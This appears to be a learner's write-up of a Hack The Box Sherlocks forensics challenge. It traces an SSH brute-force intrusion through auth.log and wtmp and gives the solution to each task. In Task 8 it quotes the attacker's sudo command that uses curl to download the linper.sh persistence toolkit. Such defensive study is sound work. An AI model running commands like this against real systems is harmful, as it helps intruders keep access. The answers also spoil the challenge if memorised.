Now, I've completed a security defense scanario classified as a  **Sherlocks challange**

## Task 1
**Analyze the auth.log. What is the IP address used by the attacker to carry out a brute force attack?**
First, I downloaded `Brutis.zip`, but I needed a password. Hack the box provided the password in this case: `hacktheblue`
![[T01-HIstorialDeDescarga.png]]
![[T01-Unzip.png]]

I read the content of  `auth.log` and identified the IP that tried to log in as a admin multiple times. The IP I identified was:  65.2.161.68
![[T01-IdentifiedIP.png]]
**Solution:** 65.2.161.68

## Task 2

**The bruteforce attempts were successful and attacker gained access to an account on the server. What is the username of the account?**
In this part, i looked for keywords that helped me find which account was attack. I used the command: 
`cat auth.log | grep "session opened"  2>/dev/null`
I identified that user root grant permission 
![[T05-Attacker gained access.png]]
**Solution:** root
## Task 3

**Identify the UTC timestamp when the attacker logged in manually to the server and established a terminal session to carry out their objectives. The login time will be different than the authentication time, and can be found in the wtmp artifact.**

I made a backup of the original script before editing
`cp utmp.py utmp.py.bak`

I edited the script to convert  local time to UTC
`sed -i 's/datetime\.fromtimestamp(/datetime.utcfromtimestamp(/g; s/time\.localtime(/time.gmtime(/g' utmp.py`

Then I executed the script to generate the `wtmp.out` file
`python3 utmp.py -o wtmp.out wtmp`

I found the login time for the attacker's IP
`grep "65.2.161.68" wtmp.out`
 ![[T03-UTC logged.png]]
**Solution:** 2024-03-06 06:32:45

## Task 4

**SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker's session for the user account from Question 2?**
I  dentified two logins 
![[T04-login session 1.png]]
To view only open session, I used 
`cat auth.log | grep "logged"  2>/dev/null`
![[T04-logged.png]]

**Solution:** 37

## Task 5

The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?
In the task 2, we identified that  **root** user was compromised. During this process, I found  that the new user added by the attacker was  `cyberjunkie`
![[T05-Attacker gained access.png]]
**Solution:** cyberjunkie

## Task 6

What is the MITRE ATT&CK sub-technique ID used for persistence by creating a new account?
I went to the MITRE ATT&CK page and found the persistence technique and sub-technique related to creating accouts to maintain acces on the victim system
![[T06-MItre persistence.png]]
**Solution:** T1136.001

## Task 7
What time did the attacker's first SSH session end according to auth.log?
`grep sshd:session  auth.log`
![[T07-ssh.png]]
The second session closure is more important because the attacker stayed connected for several minutes.

**Solution:** 2024-03-06 06:37:24
## Task 8
The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?
I found the actions executed with sudo
`grep sudo  auth.log`
![[T08-sudo.png]]
**Solution:** /usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh